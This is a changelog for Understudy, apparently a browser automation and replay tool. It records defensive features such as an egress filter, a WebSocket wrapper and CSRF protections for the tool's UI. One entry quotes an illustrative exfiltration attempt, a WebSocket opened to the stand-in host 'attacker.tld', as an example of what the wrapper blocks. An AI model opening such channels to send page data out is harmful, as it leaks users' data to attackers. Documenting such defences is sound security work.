# Changelog

All notable changes to Understudy. Follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and [SemVer](https://semver.org/).

## [0.3.0] — 2026-04-13

### Added

- **Sub-resource egress filter** for replay (`understudy/replay/egress.py`).
  `ctx.route("**/*")` blocks every outbound request — document, image,
  script, stylesheet, XHR/fetch, media, font, WebSocket — to any host not
  in the recipe's `allowed_origins`. Closes the zero-click exfil path
  where a compromised allow-listed origin (stored XSS, hijacked CDN,
  malicious ad) could beacon DOM scrapes to an attacker.
- **Capture-time origin tracking.** `BrowserRecorder` hooks
  `context.on("request")` and `page.on("websocket")` during recording,
  writes the observed-host set to a `<id>.meta.json` sidecar, which
  induction persists into `Recipe.allowed_origins`.
- **In-page `window.WebSocket` wrapper** (init script) — page code that
  attempts `new WebSocket("wss://attacker.tld/")` receives a SecurityError.
  Covers the WS upgrade that Playwright's `route()` does not.
- **`note` step data extraction.** When a `note` recipe step has an ARIA
  target, `_do_note` reads `inner_text` on the located element. The
  Replayer persists the extracted text to
  `<replays_dir>/<run_id>.notes.jsonl` (one line per note), giving
  recipes a way to produce structured output.
- **CSV batch replay.** `understudy replay <recipe-id> --csv rows.csv`
  runs the recipe once per row and writes a rectangular results CSV
  whose columns are the input columns unioned with every distinct
  extract key. Python API is `understudy.replay.batch.run_batch`;
  the CLI is a thin wrapper.
- **Runnable eval harness.** `understudy eval` starts a loopback
  fixture server, serves HTML pages from `evals/fixtures/`, replays
  each case's recipe against every variant, and writes `results.jsonl`
  + `results.md` under `evals/runs/<timestamp>/`.
- **Hero case: `repo_triage`** — 6-field metadata extraction across
  baseline + 3 perturbation variants (sibling-wrapper injection,
  DOM-order shuffle, accessible-name rewrite). 3/4 pass on v0.3.
  The rename variant is the known-hard case that motivates LLM
  regrounding in v0.4.
- **Memory-graph UI polish.** Resynth pending state now shows a cinder
  sweep shimmer (the lime diff flash lands after ~700–1500 ms and the
  wait previously read as dead UI). Run button tooltip explains the
  terminal path clearly instead of ending as a dead tooltip.

### Changed

- **Grounding falls back to `get_by_label` / `get_by_text`** when a step
  has an accessible name but no ARIA role — covers `<span aria-label>`
  metadata cells. Previously such steps errored with "could not locate
  <no-role>[name]".
- **`known_hosts` now includes `allowed_origins`** — the HITL
  unknown-domain gate no longer trips when the current page's host is in
  the recipe's egress allowlist but not in any nav step's URL.
- **Step cards in the UI are now clickable.** React Flow was setting
  `pointer-events: none` on nodes with `draggable:false, selectable:false`;
  the inner `<button>` never received clicks. Fixed with a node-level
  `pointer-events: all` plus the `nodrag nopan` class.

### Security

- **Threat model bumped to v0.3.** README rewritten to reflect the new
  egress filter, the WebSocket wrapper (and its residual observe-only
  safety net for browser-internal connections), and that the
  sub-resource exfil path is no longer in "planned" state.

### Removed

- Legacy `evals/cases/google_search.yaml` (predated the structured case
  schema with `variants` + `expect_extracts`).

## [0.2.0] — 2026-04-13

### Added

- **Local web UI** (`understudy ui`) — FastAPI server on 127.0.0.1 +
  React 18 + TypeScript + React Flow + Tailwind. Editable memory-graph
  DAG. Double-click a step, edit natural-language intent, Claude
  re-synthesises structured fields, diff preview, accept/revert.
- **Security envelope for the UI:** per-session 256-bit CSRF token in
  launch URL, Host allow-list, Origin + Sec-Fetch-Site middleware,
  strict CSP, frame-ancestors 'none', XML-delimited untrusted intent
  on re-synth, schema-validated output with one-retry fallback.

## [0.1.0] — 2026-04-07

### Added

- Browser capture (Playwright, ARIA-anchored), recipe induction (Claude
  Sonnet 4.5), replay engine with structural grounding + live Rich UI,
  HITL gate (deny-default), SQLCipher-encrypted local DB when installed,
  regex redaction + URL allow-list (hardened against userinfo / IDNA /
  IP-literal bypass), nonce-gated page→host binding, CI pipeline
  (ruff + basedpyright + pytest + bandit + OSV-Scanner), threat model.

[0.3.0]: https://github.com/CloudCrewAtWork/understudy/releases/tag/v0.3.0
[0.2.0]: https://github.com/CloudCrewAtWork/understudy/releases/tag/v0.2.0
[0.1.0]: https://github.com/CloudCrewAtWork/understudy/releases/tag/v0.1.0
